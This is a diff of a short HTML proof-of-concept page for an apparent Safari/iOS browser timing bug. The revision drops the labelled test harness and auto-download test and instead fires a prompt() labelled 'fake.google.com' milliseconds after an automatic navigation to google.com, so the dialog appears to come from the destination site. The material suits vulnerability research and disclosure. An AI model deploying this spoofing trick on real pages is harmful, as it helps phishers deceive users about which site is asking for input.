@@ -1,60 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>iOS Browser Permission Timing PoC</title>
+<meta charset="utf-8">
+<title>Safari Quick Dialog PoC</title>
 </head>
-
-<body style="background:#111; color:#fff; text-align:center; font-family:sans-serif;">
-<h2>PoC – iOS Browser Permission & Navigation Timing</h2>
-
-<button id="start" style="font-size:22px; padding:12px 24px;">
-Start Test
-</button>
-
-<pre id="log"
-style="text-align:left; margin:20px auto; width:90%; max-width:900px;
-background:#000; padding:16px; border-radius:8px;"></pre>
+<body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;">
+<h3>Loading…</h3>
 
 <script>
-const log = msg => {
-  document.getElementById("log").textContent += msg + "\n";
-  console.log("[PoC]", msg);
-};
+// Langsung race dialog dengan navigation
+setTimeout(() => {
 
-document.getElementById("start").onclick = () => {
-  log("[INFO] User gesture received");
+  // Trigger top-level navigation
+  location.href = "https://www.google.com";
 
-  // 1️⃣ Delayed navigation
-  setTimeout(() => {
-    log("[INFO] Triggering top-level navigation…");
-    location.href = "https://www.google.com";
-  }, 1200);
-
-  // 2️⃣ Dialog during navigation window
+  // Race prompt() tepat setelah navigation
   setTimeout(() => {
     try {
-      prompt(
-        "fake.google.com\n⚠️ Do not sign into your account",
-        ""
-      );
-      log("[BUG] prompt() shown during navigation ❌");
-    } catch (e) {
-      log("[OK] prompt() blocked ✔");
-    }
-  }, 1300);
+      prompt("fake.google.com\n⚠️ Do not sign into your account", "");
+    } catch (e) {}
+  }, 10); // 10ms after navigation
 
-  // 3️⃣ Auto-download attempt
-  setTimeout(() => {
-    log("[TEST] Triggering auto-download");
-    const a = document.createElement("a");
-    a.href = URL.createObjectURL(
-      new Blob(["test"], { type: "text/plain" })
-    );
-    a.download = "test.txt";
-    a.click();
-  }, 1400);
-};
+}, 100); // 100ms delay biar page settle
 </script>
 </body>
 </html>
